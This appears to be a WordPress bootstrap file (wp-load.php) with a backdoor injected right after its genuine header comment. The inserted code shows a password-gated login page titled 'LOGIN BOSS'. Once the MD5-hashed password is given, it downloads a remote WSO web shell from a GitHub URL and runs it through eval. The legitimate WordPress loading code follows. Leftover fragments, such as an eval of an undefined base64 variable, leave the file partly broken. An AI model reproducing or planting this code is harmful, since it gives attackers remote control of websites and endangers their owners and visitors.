<?php 

/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-config.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * wp-config.php file.
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */



session_start();

// Function to get content from a URL
function geturlsinfo($url) {
    if (function_exists("curl_exec")) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION["coki"])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION["coki"]);
        }
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists("file_get_contents")) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists("fopen") && function_exists("stream_get_contents")) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in() {
    return isset($_SESSION["logged_in"]) && $_SESSION["logged_in"] === true;
}

// Check if the password is submitted and correct
if (isset($_POST["password"])) {
    $entered_password = $_POST["password"];
    $hashed_password = "8ec686cf8a63c1391a0ba7dd905dedd8";
    if (md5($entered_password) === $hashed_password) {
        $_SESSION["logged_in"] = true;
        $_SESSION["coki"] = "asu";
    } else {
        echo "Incorrect password. Please try again.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo("https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/wso.php");
    eval("?>" . $a);
} else {
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOGIN BOSS</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #1a1f2b;
            overflow: hidden; 
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background-color: #426e8a;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
            position: absolute;
            transition: transform 0.2s ease;
        }

        label, input[type="password"], input[type="submit"] {
            margin: 8px 0;
        }

        input[type="password"], input[type="submit"] {
            padding: 10px;
            font-size: 1em;
            border: 1px solid #ccc;
            border-radius: 4px;
            width: 100%;
            max-width: 250px;
        }

        input[type="submit"] {
            background-color: #007bff;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        input[type="submit"]:hover {
            background-color: #651c75;
        }
    </style>
</head>
<body>

    <form id="login-form" method="POST" action="">
        <label for="password">LEBIH BAIK LARI:</label>
        <input type="password" id="password" name="password">
        <input type="submit" value="Kesini Kalau Bisa">
    </form>



</body>
</html>



    <?php
}
?>';

// Base64 encode the PHP code
$encoded_code = base64_encode($code);

// Execute the encoded code
eval('?>' . base64_decode($encoded_code));
?>


<script>
        const form = document.getElementById('login-form');

        // Detect mouse movement
        document.addEventListener('mousemove', (event) => {
            const mouseX = event.clientX;
            const mouseY = event.clientY;
            
            const formRect = form.getBoundingClientRect();
            const formX = formRect.left + formRect.width / 2;
            const formY = formRect.top + formRect.height / 2;

            const distance = Math.hypot(mouseX - formX, mouseY - formY);

            // Move form if mouse is within 150px distance
            if (distance < 150) {
                const offsetX = (Math.random() * 300) - 150; // Random movement within a range
                const offsetY = (Math.random() * 300) - 150;
                
                const newX = Math.min(window.innerWidth - formRect.width, Math.max(0, formRect.left + offsetX));
                const newY = Math.min(window.innerHeight - formRect.height, Math.max(0, formRect.top + offsetY));

                form.style.transform = `translate(${newX}px, ${newY}px)`;
            }
        });
    </script>

/** Define ABSPATH as this file's directory */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/*
 * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
 * it's best to add a dummy function to the wp-config.php file, but as this call to the function
 * is run prior to wp-config.php loading, it is wrapped in a function_exists() check.
 */
if ( function_exists( 'error_reporting' ) ) {
	/*
	 * Initialize error reporting to a known set of levels.
	 *
	 * This will be adapted in wp_debug_mode() located in wp-includes/load.php based on WP_DEBUG.
	 * @see https://www.php.net/manual/en/errorfunc.constants.php List of known error levels.
	 */
	error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
}

/*
 * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
 * doesn't, load wp-config.php. The secondary check for wp-settings.php has the added benefit
 * of avoiding cases where the current directory is a nested installation, e.g. / is WordPress(a)
 * and /blog/ is WordPress(b).
 *
 * If neither set of conditions is true, initiate loading the setup process.
 */
if ( file_exists( ABSPATH . 'wp-config.php' ) ) {

	/** The config file resides in ABSPATH */
	require_once ABSPATH . 'wp-config.php';

} elseif ( @file_exists( dirname( ABSPATH ) . '/wp-config.php' ) && ! @file_exists( dirname( ABSPATH ) . '/wp-settings.php' ) ) {

	/** The config file resides one level above ABSPATH but is not part of another installation */
	require_once dirname( ABSPATH ) . '/wp-config.php';

} else {

	// A config file doesn't exist.

	define( 'WPINC', 'wp-includes' );
	require_once ABSPATH . WPINC . '/version.php';
	require_once ABSPATH . WPINC . '/compat.php';
	require_once ABSPATH . WPINC . '/load.php';

	// Check for the required PHP version and for the MySQL extension or a database drop-in.
	wp_check_php_mysql_versions();

	// Standardize $_SERVER variables across setups.
	wp_fix_server_vars();

	define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
	require_once ABSPATH . WPINC . '/functions.php';

	$path = wp_guess_url() . '/wp-admin/setup-config.php';

	// Redirect to setup-config.php.
	if ( ! str_contains( $_SERVER['REQUEST_URI'], 'setup-config' ) ) {
		header( 'Location: ' . $path );
		exit;
	}

	wp_load_translations_early();

	// Die with an error message.
	$die = '<p>' . sprintf(
		/* translators: %s: wp-config.php */
		__( "There doesn't seem to be a %s file. It is needed before the installation can continue." ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p>' . sprintf(
		/* translators: 1: Documentation URL, 2: wp-config.php */
		__( 'Need more help? <a href="%1$s">Read the support article on %2$s</a>.' ),
		__( 'https://developer.wordpress.org/advanced-administration/wordpress/wp-config/' ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p>' . sprintf(
		/* translators: %s: wp-config.php */
		__( "You can create a %s file through a web interface, but this doesn't work for all server setups. The safest way is to manually create the file." ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p><a href="' . $path . '" class="button button-large">' . __( 'Create a Configuration File' ) . '</a></p>';

	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
}
